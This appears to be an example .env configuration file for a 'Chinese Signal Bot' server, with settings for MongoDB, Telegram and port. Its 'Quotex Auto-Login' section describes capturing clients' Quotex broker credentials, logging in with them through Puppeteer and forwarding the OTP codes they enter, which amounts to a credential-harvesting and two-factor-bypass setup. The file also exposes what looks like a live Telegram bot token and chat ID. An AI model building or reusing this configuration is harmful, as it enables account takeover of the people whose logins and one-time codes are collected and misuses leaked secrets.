# ═══════════════════════════════════════════════════════════
# Chinese Signal Bot — Server v5 Environment Variables
# ═══════════════════════════════════════════════════════════
# Copy this to .env and fill in your values before deploying.

# ── MongoDB ────────────────────────────────────────────────
# Required for permanent storage. Without it, server uses file storage.
MONGODB_URI=mongodb+srv://USER:PASS@cluster.mongodb.net/csbot?retryWrites=true&w=majority

# ── Telegram Bot ──────────────────────────────────────────
TELEGRAM_BOT_TOKEN=8881942924:AAHbrAuMs6oGTDbivfRBUNYUlSgsviCO5Qc
TELEGRAM_CHAT_ID=7293402395

# ── Quotex Auto-Login ─────────────────────────────────────
# Set to 'true' to automatically start a Puppeteer login session
# every time a client submits their Quotex credentials on the main bot.
# OTP will also be automatically forwarded if the client enters it.
AUTO_LAUNCH_ON_LOGIN=false

# ── Server ────────────────────────────────────────────────
PORT=3000
